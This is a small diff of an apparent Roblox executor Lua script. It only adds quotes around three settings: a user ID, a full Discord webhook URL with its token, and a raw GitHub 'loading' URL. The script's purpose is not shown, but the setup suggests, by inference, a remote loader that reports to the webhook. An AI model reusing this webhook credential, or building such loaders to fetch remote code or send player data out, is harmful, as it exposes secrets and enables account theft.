@@ -1,6 +1,6 @@
-local dhuser = 4877888726     
-local dhwebhook = https://discord.com/api/webhooks/1135780890853781657/6TSRcLwDmW0rASe9JxVDECSy74zvHWQetuefntGcZ6AyuD32zyJi52cbfBw_vTlyuswa 
-local loadingraw = https://raw.githubusercontent.com/MihyeGaming/mihyeGaming/main/loading 
+local dhuser = "4877888726"     
+local dhwebhook = "https://discord.com/api/webhooks/1135780890853781657/6TSRcLwDmW0rASe9JxVDECSy74zvHWQetuefntGcZ6AyuD32zyJi52cbfBw_vTlyuswa" 
+local loadingraw = "https://raw.githubusercontent.com/MihyeGaming/mihyeGaming/main/loading"
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
